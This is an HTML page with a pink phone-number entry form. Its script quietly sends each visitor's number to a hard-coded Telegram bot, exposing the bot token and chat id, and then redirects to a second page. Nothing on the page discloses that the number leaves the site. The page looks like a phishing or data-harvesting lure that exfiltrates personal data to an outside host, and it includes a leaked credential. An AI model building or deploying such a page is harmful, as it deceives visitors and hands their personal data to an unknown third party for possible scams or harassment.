<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Enter Your Number</title>
    <style>
      @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap");

      body {
        font-family: "Poppins", sans-serif;
        background-color: #f03876;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }

      .container {
        background: white;
        padding: 30px;
        border-radius: 20px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
        text-align: center;
        width: 360px; /* Increased width */
      }

      h1 {
        color: #d81b60;
        font-size: 24px;
        font-weight: 600;
      }

      input {
        width: 95%;
        padding: 14px;
        margin: 14px 0;
        border: none;
        border-radius: 10px;
        font-size: 16px;
        background: #ffe6ee;
        color: #333;
        outline: none;
        text-align: center;
      }

      input::placeholder {
        color: #888;
      }

      button {
        background-color: #d81b60;
        color: white;
        border: none;
        padding: 14px;
        font-size: 18px;
        cursor: pointer;
        border-radius: 10px;
        width: 100%;
        font-weight: 600;
        transition: 0.3s;
      }

      button:hover {
        background-color: #c2185b;
      }


    </style>
    <script>
      function validateAndSend() {
        const number = document.getElementById("number").value;
        const numberPattern = /^\d{10}$/; // Regular expression to match exactly 10 digits

        if (!numberPattern.test(number)) {
          alert("Please enter your correct number to go to the next page.");
          return;
        }

        // Send message to Telegram
        fetch("https://api.telegram.org/bot7801146737:AAE5P6QBDiex74kWz1IC3EGldWf0axgEaH0/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: "6363036969",
            text: `User's number: ${number}`,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            if (data.ok) {
              console.log("Message sent to Telegram:", data);
              window.location.href = "index1.html"; // Redirect after sending message
            } else {
              throw new Error(data.description);
            }
          })
          .catch((error) => {
            console.error("Error sending message:", error);
            alert("Failed to send message to Telegram: " + error.message);
          });
      }
    </script>
  </head>
  <body>
    <div class="container">
      <h1>ðŸŽ€ Please Enter Your Number ðŸŽ€</h1>
      <input type="tel" id="number" placeholder="Enter your number" />
      <button onclick="validateAndSend()">Next</button>
    </div>
  </body>
</html>
